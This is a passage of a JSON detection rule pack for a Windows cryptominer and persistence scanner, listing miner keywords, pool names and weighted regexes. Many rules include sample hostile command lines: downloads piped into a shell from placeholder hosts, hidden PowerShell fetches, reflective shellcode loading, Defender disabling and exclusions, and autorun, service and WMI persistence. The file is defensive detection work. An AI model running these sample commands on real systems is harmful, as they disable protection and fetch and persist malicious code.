{
  "pack": "core",
  "version": "2026.09.26.1",
  "description": "MineHunter core rule pack: generic miner / persistence / masquerade indicators. Data only - update without rebuilding the EXE.",

  "minerStrings": {
    "protocol": ["stratum+tcp://", "stratum+ssl://", "stratum+tls://", "stratum2+tcp://", "mining.subscribe", "mining.authorize", "mining.submit", "--donate-level", "donate-over-proxy", "--donate-over-proxy"],
    "algorithm": ["cryptonight", "randomx", "rx/0", "cn/r", "cn/half", "cn-heavy", "argon2/chukwa", "ghostrider", "kawpow", "autolykos", "ethash", "etchash", "kheavyhash"],
    "program": ["xmrig", "xmr-stak", "xmrstak", "cpuminer", "lolminer", "nbminer", "gminer", "srbminer", "t-rex", "teamredminer", "phoenixminer", "ethminer", "bminer", "wildrig", "nanominer", "rigel miner", "kryptex", "moneroocean"],
    "pool": ["supportxmr", "minexmr", "nanopool.org", "2miners.com", "herominers", "hashvault.pro", "c3pool.org", "unmineable.com", "f2pool.com", "ethermine.org", "flexpool.io", "nicehash.com", "woolypooly", "hiveon.net", "poolin.com", "antpool.com", "k1pool.com"],
    "tuning": ["--cpu-priority", "--max-cpu-usage", "--huge-pages", "msr mod", "hashrate", "randomx dataset", "winring0"]
  },

  "cmdlinePatterns": [
    { "id": "CMD.MINER.STRATUM_URL", "regex": "stratum2?\\+(tcp|ssl|tls|udp)://", "weight": 40, "definitive": false, "category": "Content", "text": "Command line points to a mining pool (stratum URL)" },
    { "id": "CMD.MINER.DONATE_LEVEL", "regex": "--donate-(level|over-proxy)", "weight": 40, "definitive": true, "category": "Content", "text": "XMRig-style --donate-level option in the command line" },
    { "id": "CMD.MINER.ALGO_FLAG", "regex": "(^|\\s)(-a|--algo)[= ]+(rx/|cn/|cn-|randomx|kawpow|ethash|etchash|autolykos|ergo|kheavyhash|scrypt|x16r|x16rv2|cryptonight|argon2|ghostrider|verushash|equihash)", "weight": 30, "definitive": false, "category": "Content", "text": "Mining algorithm selected on the command line" },
    { "id": "CMD.MINER.POOL_USER", "regex": "(^|\\s)(-o|--url)[= ]+\\S+:\\d{2,5}.*(^|\\s)(-u|--user)[= ]+\\S+", "weight": 35, "definitive": false, "category": "Content", "text": "Pool address plus user/wallet on the command line" },
    { "id": "CMD.MINER.WALLET_XMR", "regex": "\\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\\b", "weight": 35, "definitive": false, "category": "Content", "text": "Monero wallet address in the command line" },
    { "id": "CMD.MINER.POOL_NAME", "regex": "(supportxmr|minexmr|moneroocean|nanopool|2miners|herominers|hashvault|c3pool|f2pool|unmineable|ethermine|flexpool|nicehash|woolypooly|hiveon|kryptex|miningpoolhub|antpool|viabtc|poolin|zpool|prohashing|k1pool|ezil)\\.", "weight": 25, "definitive": false, "category": "Content", "text": "Command line references a known mining pool" },
    { "id": "CMD.MINER.CPU_TUNING", "regex": "--(cpu-priority|max-cpu-usage|cpu-affinity|randomx-mode|huge-pages|threads=\\d+.*--coin|coin[= ](xmr|monero|etc|rvn|ergo))", "weight": 20, "definitive": false, "category": "Content", "text": "Miner tuning options in the command line" },
    { "id": "CMD.PS.ENCODED", "regex": "powershell(\\.exe)?[^|&;]*\\s-(e|ec|enc|encodedcommand)\\s+[A-Za-z0-9+/=]{40,}", "weight": 25, "definitive": false, "category": "Persistence", "text": "Hidden PowerShell with an encoded command" },
    { "id": "CMD.PS.DOWNLOAD_EXEC", "regex": "(iex|invoke-expression)[^|]*\\b(downloadstring|invoke-webrequest|iwr|irm|invoke-restmethod|webclient)\\b|\\b(downloadstring|downloadfile)\\b.*(iex|invoke-expression|start-process)", "weight": 30, "definitive": false, "category": "Persistence", "text": "PowerShell downloads and runs code" },
    { "id": "CMD.DEFENDER.EXCLUSION", "regex": "(add|set)-mppreference[^|]*-exclusion(path|process|extension)", "weight": 35, "definitive": false, "category": "Tamper", "text": "Command adds Microsoft Defender exclusions" },
    { "id": "CMD.DEFENDER.EXCLUSION_BROAD", "regex": "(add|set)-mppreference[^|]*-exclusionpath\\s+[@(]*['\"]?([a-z]:\\\\?|%(temp|tmp|appdata|localappdata|programdata|userprofile|public)%\\\\?|[a-z]:\\\\(users|programdata|windows|program files)(\\\\?|\\\\[^\\\\'\"]+\\\\?))['\"]?\\s*(\\)|,|;|$|\\s-)", "weight": 45, "definitive": false, "category": "Tamper", "text": "Command excludes an entire drive or system folder from Microsoft Defender" },
    { "id": "CMD.DEFENDER.DISABLE", "regex": "(set-mppreference[^|]*-disable(realtimemonitoring|behaviormonitoring|ioavprotection|scriptscanning)|sc(\\.exe)?\\s+(stop|config)\\s+windefend|disableantispyware)", "weight": 35, "definitive": false, "category": "Tamper", "text": "Command disables Microsoft Defender" },
    { "id": "CMD.LOLBIN.REMOTE", "regex": "(mshta(\\.exe)?\\s+https?://|regsvr32(\\.exe)?[^|]*/i:https?://|rundll32(\\.exe)?\\s+javascript:|certutil(\\.exe)?[^|]*-urlcache[^|]*http|bitsadmin(\\.exe)?[^|]*/transfer)", "weight": 35, "definitive": false, "category": "Persistence", "text": "Living-off-the-land binary fetches remote content" },
    { "id": "CMD.CMD.CHAIN", "regex": "cmd(\\.exe)?\\s+/c\\s+.*(&&|&)\\s*(start|powershell|schtasks|reg\\s+add|attrib)", "weight": 12, "definitive": false, "category": "Persistence", "text": "cmd.exe chain that starts other tools" },
    { "id": "CMD.SCHTASKS.MINUTE", "regex": "schtasks(\\.exe)?\\s+/create[^|]*/sc\\s+minute[^|]*/mo\\s+[1-5]\\b", "weight": 20, "definitive": false, "category": "Persistence", "text": "Task created to run every few minutes (respawn / watchdog pattern)" },
    { "id": "CMD.POWERCFG.NEVER", "regex": "powercfg(\\.exe)?\\s+[^|]*(hibernate\\s+off|-h\\s+off|standby-timeout-(ac|dc)\\s+0)", "weight": 6, "definitive": false, "category": "Behavior", "text": "Sleep/hibernate disabled (common in miner installers)" },
    { "id": "CMD.RDP.WRAPPER", "regex": "(rdpwinst|rdpwrap)", "weight": 25, "definitive": false, "category": "Persistence", "text": "RDP Wrapper installation (used by many miner/RAT bundles)" },
    {"id": "CMD.MINER.WALLET_ETH", "regex": "(^|\\s)(-u|--user|-w|--wallet)[= ]+\"?0x[0-9a-fA-F]{40}", "weight": 30, "definitive": false, "category": "Content", "text": "Ethereum-style wallet passed as the pool user/wallet on the command line", "textRu": "В командной строке адрес кошелька Ethereum в качестве пользователя пула", "samples": {"match": ["miner.exe -o pool.example:4444 -u 0x0123456789abcdef0123456789abcdef01234567 -p x"], "noMatch": ["tool.exe --user alice --wallet-file c:\\wallets\\a.json"]}},
    {"id": "CMD.MINER.HTTP_API", "regex": "--http-(enabled|port|host|access-token)\\b", "weight": 12, "definitive": false, "category": "Content", "text": "Miner-style local HTTP API switch (--http-port / --http-access-token)", "textRu": "Ключ локального HTTP-API майнера (--http-port / --http-access-token)", "samples": {"match": ["prog.exe --http-enabled --http-port 3333 --http-access-token abc"], "noMatch": ["python.exe -m http.server 4444", "node.exe server.js --port 3333"]}},
    {"id": "CMD.MINER.KILL_COMPETITORS", "regex": "taskkill(\\.exe)?[^|&;]*/im\\s+\"?(xmrig|minerd|cpuminer|nbminer|lolminer|t-rex|phoenixminer|ethminer|xmr-stak|teamredminer|nanominer|srbminer|gminer|wildrig|bminer|cgminer|sgminer|ccminer)", "weight": 25, "definitive": false, "category": "Content", "text": "Command that kills other cryptominers (miner droppers remove competitors)", "textRu": "Команда завершает чужие майнеры (так делают дропперы майнеров, убирая конкурентов)", "samples": {"match": ["cmd /c taskkill /f /im xmrig.exe & taskkill /f /im minerd.exe", "taskkill /F /IM \"nbminer.exe\""], "noMatch": ["taskkill /f /im notepad.exe", "taskkill /im chrome.exe"]}},
    {"id": "CMD.DEFENDER.REG_EXCLUSION", "regex": "reg(\\.exe)?\\s+add\\s+\"?hk(lm|ey_local_machine)\\\\software\\\\(policies\\\\)?microsoft\\\\windows defender\\\\(exclusions|real-time protection)", "weight": 40, "definitive": false, "category": "Tamper", "text": "Registry command that adds Defender exclusions or switches its real-time protection off", "textRu": "Команда реестра добавляет исключения Защитника или отключает его защиту в реальном времени", "samples": {"match": ["reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" /v C:\\ /t REG_DWORD /d 0 /f", "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection /v DisableRealtimeMonitoring /d 1"], "noMatch": ["reg add HKCU\\Software\\MyApp /v Path /d C:\\MyApp"]}},
    {"id": "CMD.DEFENDER.CLOUD_OFF", "regex": "set-mppreference[^|&;]*-(mapsreporting\\s+(0|disabled)|submitsamplesconsent\\s+(2|neversend)|puaprotection\\s+(0|disabled))", "weight": 20, "definitive": false, "category": "Tamper", "text": "Command that turns off Defender cloud protection / sample submission / PUA protection", "textRu": "Команда отключает облачную защиту Защитника, отправку образцов или защиту от нежелательных программ", "samples": {"match": ["powershell Set-MpPreference -MAPSReporting 0 -SubmitSamplesConsent 2"], "noMatch": ["powershell Get-MpPreference"]}},
    {"id": "CMD.DEFENDER.SERVICES_OFF", "regex": "sc(\\.exe)?\\s+(config|stop|delete)\\s+(wdboot|wdfilter|wdnissvc|sense|securityhealthservice|mpssvc)\\b", "weight": 35, "definitive": false, "category": "Tamper", "text": "Command that stops or disables Defender / Security Center / firewall services", "textRu": "Команда останавливает или отключает службы Защитника, Центра безопасности или брандмауэра", "samples": {"match": ["sc config WdFilter start= disabled", "sc stop Sense"], "noMatch": ["sc query spooler", "sc config wuauserv start= demand"]}},
    {"id": "CMD.DEFENDER.KILL", "regex": "taskkill(\\.exe)?[^|&;]*/im\\s+\"?(msmpeng|nissrv|securityhealthservice|smartscreen)", "weight": 35, "definitive": false, "category": "Tamper", "text": "Command that kills a Windows Defender / Security Center process", "textRu": "Команда завершает процесс Защитника Windows / Центра безопасности", "samples": {"match": ["taskkill /f /im MsMpEng.exe", "cmd /c taskkill /F /IM SecurityHealthService.exe"], "noMatch": ["taskkill /f /im notepad.exe", "taskkill /im avp.exe"]}},
    {"id": "CMD.SECURITY.KILL", "regex": "taskkill(\\.exe)?[^|&;]*/im\\s+\"?(avastsvc|avgsvc|avp|ekrn|bdagent|mbamservice|savservice|cylancesvc|csfalconservice|sentinelagent)", "weight": 12, "definitive": false, "category": "Tamper", "text": "Command that kills a third-party antivirus agent (installers do it for their own product; malware does it for everyone)", "textRu": "Команда завершает агент стороннего антивируса (установщики делают это со своим продуктом, вредоносные программы — со всеми)", "samples": {"match": ["taskkill /f /im avp.exe", "cmd /c taskkill /F /IM mbamservice.exe"], "noMatch": ["taskkill /f /im notepad.exe", "taskkill /f /im MsMpEng.exe"]}},
    {"id": "CMD.SVC.USERPATH", "regex": "sc(\\.exe)?\\s+create\\s+\\S+[^|&;]*binpath=\\s*\"?[^|&;]*(\\\\appdata\\\\|\\\\temp\\\\|\\\\programdata\\\\|%temp%|%appdata%|%localappdata%|%programdata%|\\\\users\\\\public\\\\)", "weight": 25, "definitive": false, "category": "Persistence", "text": "Command that installs a service running a program from a user-writable folder", "textRu": "Команда создаёт службу, запускающую программу из пользовательской папки", "samples": {"match": ["sc create MyUpdater binPath= \"C:\\Users\\bob\\AppData\\Roaming\\upd\\svc.exe\" start= auto"], "noMatch": ["sc create MyApp binPath= \"C:\\Program Files\\MyApp\\app.exe\""]}},
    {"id": "CMD.SCHTASKS.USERPATH", "regex": "schtasks(\\.exe)?\\s+/create[^|&;]*/tr\\s+\"?[^|&;]*(\\\\appdata\\\\|\\\\temp\\\\|\\\\programdata\\\\|%temp%|%appdata%|%localappdata%|%programdata%|\\\\users\\\\public\\\\)", "weight": 20, "definitive": false, "category": "Persistence", "text": "Command that creates a scheduled task running a program from a user-writable folder", "textRu": "Команда создаёт задачу планировщика, запускающую программу из пользовательской папки", "samples": {"match": ["schtasks /create /sc onlogon /tn Upd /tr \"C:\\Users\\bob\\AppData\\Local\\Temp\\a.exe\" /ru system"], "noMatch": ["schtasks /create /sc daily /tn Backup /tr \"C:\\Program Files\\Backup\\b.exe\""]}},
    {"id": "CMD.RUNKEY.USERPATH", "regex": "reg(\\.exe)?\\s+add\\s+\"?hk(cu|lm|ey_current_user|ey_local_machine)\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run[^|&;]*/d\\s+\"?[^|&;]*(\\\\appdata\\\\|\\\\temp\\\\|\\\\programdata\\\\|%temp%|%appdata%|%localappdata%|%programdata%|\\\\users\\\\public\\\\)", "weight": 20, "definitive": false, "category": "Persistence", "text": "Command that writes an autorun value pointing at a user-writable folder", "textRu": "Команда пишет значение автозапуска, указывающее в пользовательскую папку", "samples": {"match": ["reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Upd /d \"%APPDATA%\\upd\\a.exe\" /f"], "noMatch": ["reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v App /d \"C:\\Program Files\\App\\app.exe\""]}},
    {"id": "CMD.WMI.SUBSCRIPTION", "regex": "(__eventfilter|commandlineeventconsumer|activescripteventconsumer|__filtertoconsumerbinding|/namespace:\\\\\\\\root\\\\subscription)", "weight": 30, "definitive": false, "category": "Persistence", "text": "Creates or edits a permanent WMI event subscription (fileless persistence)", "textRu": "Создаёт или меняет постоянную WMI-подписку на события (бесфайловый автозапуск)", "samples": {"match": ["Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{}", "wmic /namespace:\\\\root\\subscription PATH __EventFilter"], "noMatch": ["Get-WmiObject Win32_Process"]}},
    {"id": "CMD.PS.HIDDEN_WEB", "regex": "powershell(\\.exe)?[^|&;]*-(w|win|window|windowstyle)\\s+hidden[^|&;]*(https?://|downloadstring|\\biwr\\b|invoke-webrequest|start-bitstransfer)", "weight": 22, "definitive": false, "category": "Persistence", "text": "Hidden PowerShell window that downloads something", "textRu": "PowerShell в скрытом окне что-то скачивает", "samples": {"match": ["powershell -w hidden -nop -c \"iwr http://example.invalid/a.ps1\"", "powershell.exe -WindowStyle Hidden -Command (New-Object Net.WebClient).DownloadString('http://x.invalid')"], "noMatch": ["powershell -File C:\\scripts\\backup.ps1", "powershell -WindowStyle Hidden -File C:\\tools\\tray.ps1"]}},
    {"id": "CMD.PS.REFLECTIVE", "regex": "(\\[(system\\.)?reflection\\.assembly\\]::load(file)?\\(|virtualalloc[\\s\\S]{0,400}?(createthread|marshal\\]::copy)|frombase64string[\\s\\S]{0,200}?(\\.load\\(|\\.invoke\\())", "weight": 20, "definitive": false, "category": "Persistence", "text": "PowerShell loads a .NET assembly / shellcode from memory (reflective loading)", "textRu": "PowerShell загружает сборку .NET / шелл-код из памяти (рефлективная загрузка)", "samples": {"match": ["[System.Reflection.Assembly]::Load([Convert]::FromBase64String($b))", "$m=[Runtime.InteropServices.Marshal]; VirtualAlloc(0,$n,0x3000,0x40); CreateThread(0,0,$p,0,0,0)"], "noMatch": ["Get-ChildItem C:\\"]}},
    {"id": "CMD.CERTUTIL.DECODE", "regex": "certutil(\\.exe)?[^|&;]*-(decode|decodehex)[^|&;]*\\.(exe|dll|bat|ps1)", "weight": 25, "definitive": false, "category": "Persistence", "text": "certutil is used to decode a payload into an executable", "textRu": "certutil используется для декодирования полезной нагрузки в исполняемый файл", "samples": {"match": ["certutil -decode a.txt b.exe", "certutil.exe -f -decode c:\\t\\x.b64 c:\\t\\run.dll"], "noMatch": ["certutil -hashfile a.exe SHA256", "certutil -store my"]}},
    {"id": "CMD.MSIEXEC.REMOTE", "regex": "msiexec(\\.exe)?\\s+[^|&;]*/(i|package)\\s+\"?https?://", "weight": 22, "definitive": false, "category": "Persistence", "text": "msiexec installs a package straight from a web address", "textRu": "msiexec ставит пакет прямо по веб-адресу", "samples": {"match": ["msiexec /q /i http://example.invalid/a.msi"], "noMatch": ["msiexec /i C:\\Setup\\app.msi /qn"]}},
    {"id": "CMD.MSHTA.SCRIPT", "regex": "mshta(\\.exe)?\\s+(vbscript|javascript):", "weight": 30, "definitive": false, "category": "Persistence", "text": "mshta runs an inline script (a common launcher for malware)", "textRu": "mshta выполняет встроенный скрипт (частый запускатель вредоносного кода)", "samples": {"match": ["mshta vbscript:CreateObject(\"Wscript.Shell\").Run(\"cmd\",0)(window.close)"], "noMatch": ["mshta C:\\apps\\help.hta"]}},
    {"id": "CMD.WMIC.PROCESS_CREATE", "regex": "wmic(\\.exe)?[^|&;]*process\\s+call\\s+create[^|&;]*(powershell|cmd|\\.exe)", "weight": 12, "definitive": false, "category": "Persistence", "text": "wmic starts a process (used to hide the parent process)", "textRu": "wmic запускает процесс (приём для сокрытия родителя)", "samples": {"match": ["wmic process call create \"powershell -w hidden -c calc\""], "noMatch": ["wmic cpu get name"]}},
    {"id": "CMD.NETSH.FW_USERPATH", "regex": "netsh(\\.exe)?\\s+advfirewall\\s+firewall\\s+add\\s+rule[^|&;]*program=\\s*\"?[^|&;]*(\\\\appdata\\\\|\\\\temp\\\\|\\\\programdata\\\\|%temp%|%appdata%|%localappdata%|%programdata%|\\\\users\\\\public\\\\)", "weight": 14, "definitive": false, "category": "Persistence", "text": "Firewall rule that allows a program from a user-writable folder", "textRu": "Правило брандмауэра разрешает программу из пользовательской папки", "samples": {"match": ["netsh advfirewall firewall add rule name=Upd dir=out action=allow program=\"C:\\Users\\bob\\AppData\\Local\\Temp\\a.exe\""], "noMatch": ["netsh advfirewall firewall add rule name=App dir=in action=allow program=\"C:\\Program Files\\App\\a.exe\""]}},
    {"id": "CMD.ATTRIB.HIDE", "regex": "attrib(\\.exe)?\\s+\\+[hs]\\s*\\+?[hs]?\\s+[^|&;]*(\\\\appdata\\\\|\\\\temp\\\\|\\\\programdata\\\\|%temp%|%appdata%|%localappdata%|%programdata%|\\\\users\\\\public\\\\)", "weight": 14, "definitive": false, "category": "Persistence", "text": "Command that hides a file or folder in a user-writable location (attrib +h +s)", "textRu": "Команда скрывает файл или папку в пользовательской области (attrib +h +s)", "samples": {"match": ["attrib +h +s \"%APPDATA%\\Update\\svc.exe\"", "cmd /c attrib +s +h C:\\Users\\bob\\AppData\\Local\\Temp\\a.exe"], "noMatch": ["attrib +r C:\\docs\\a.txt"]}},
    {"id": "CMD.ICACLS.DENY", "regex": "icacls(\\.exe)?\\s+[^|&;]*/deny\\s+(everyone|\\*s-1-1-0|system|users)", "weight": 18, "definitive": false, "category": "Tamper", "text": "icacls denies access to everyone / SYSTEM (used to stop removal of a dropped file)", "textRu": "icacls запрещает доступ всем / SYSTEM (мешает удалить подброшенный файл)", "samples": {"match": ["icacls \"%APPDATA%\\Update\" /deny Everyone:(F)", "icacls C:\\x /deny SYSTEM:(RX)"], "noMatch": ["icacls C:\\x /grant Users:(R)"]}},
    {"id": "CMD.CURL.PIPE", "regex": "(curl|wget)(\\.exe)?\\s+[^|&;]*https?://[^|&;]*\\|\\s*(cmd|powershell|sh|bash)", "weight": 30, "definitive": false, "category": "Persistence", "text": "A download piped straight into a shell", "textRu": "Скачанное сразу передаётся в оболочку для выполнения", "samples": {"match": ["curl.exe -s http://example.invalid/a | cmd", "curl https://x.invalid/i.sh | bash"], "noMatch": ["curl -o out.txt https://example.com/data.json"]}}
  ],

